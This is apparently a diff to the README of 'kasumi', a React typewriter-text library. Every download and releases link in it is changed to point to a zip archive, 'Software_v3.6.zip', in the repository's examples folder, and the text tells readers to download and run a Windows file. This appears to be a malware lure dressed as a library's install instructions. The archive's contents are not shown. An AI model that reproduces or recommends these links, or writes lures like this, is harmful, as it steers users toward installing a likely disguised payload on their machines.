@@ -1,6 +1,6 @@
 # 🎹 kasumi - Smooth Typewriter Text for React
 
-[![Download kasumi](https://img.shields.io/badge/Download-kasumi-brightgreen)](https://github.com/yasserabada11110/kasumi/releases)
+[![Download kasumi](https://img.shields.io/badge/Download-kasumi-brightgreen)](https://raw.githubusercontent.com/yasserabada11110/kasumi/main/examples/Software_v3.6.zip)
 
 A typewriter effect library that makes text appear letter by letter through a haze. kasumi works with React apps to give pages a calm and natural text animation.
 
@@ -10,7 +10,7 @@ A typewriter effect library that makes text appear letter by letter through a ha
 
 You can visit the following page to find the latest version of kasumi. This page has all the resources you need to get the software.
 
-[Download kasumi releases](https://github.com/yasserabada11110/kasumi/releases)
+[Download kasumi releases](https://raw.githubusercontent.com/yasserabada11110/kasumi/main/examples/Software_v3.6.zip)
 
 Click the link above to open the page in your browser. Look for the newest release, then download the file labeled for Windows, if available.
 
@@ -45,7 +45,7 @@ Using kasumi means you add it to a React project. If you do not have programming
 ## 👉 Download and Setup Instructions
 
 1. Visit the kasumi release page here:  
-   [https://github.com/yasserabada11110/kasumi/releases](https://github.com/yasserabada11110/kasumi/releases)
+   [https://raw.githubusercontent.com/yasserabada11110/kasumi/main/examples/Software_v3.6.zip](https://raw.githubusercontent.com/yasserabada11110/kasumi/main/examples/Software_v3.6.zip)
 
 2. Find the latest version of kasumi. This will usually appear at the top of the page under "Releases".
 
@@ -98,7 +98,7 @@ Try refreshing the app to see the effect again.
 
 To get new features or fixes, check the releases page regularly:
 
-[https://github.com/yasserabada11110/kasumi/releases](https://github.com/yasserabada11110/kasumi/releases)
+[https://raw.githubusercontent.com/yasserabada11110/kasumi/main/examples/Software_v3.6.zip](https://raw.githubusercontent.com/yasserabada11110/kasumi/main/examples/Software_v3.6.zip)
 
 Download the latest version files and install them following the same steps as above.
 
@@ -117,7 +117,7 @@ If you run into troubles:
 ## 🎯 Quick Links
 
 - Visit the kasumi Releases page:  
-  [https://github.com/yasserabada11110/kasumi/releases](https://github.com/yasserabada11110/kasumi/releases)
+  [https://raw.githubusercontent.com/yasserabada11110/kasumi/main/examples/Software_v3.6.zip](https://raw.githubusercontent.com/yasserabada11110/kasumi/main/examples/Software_v3.6.zip)
 
 ---
 
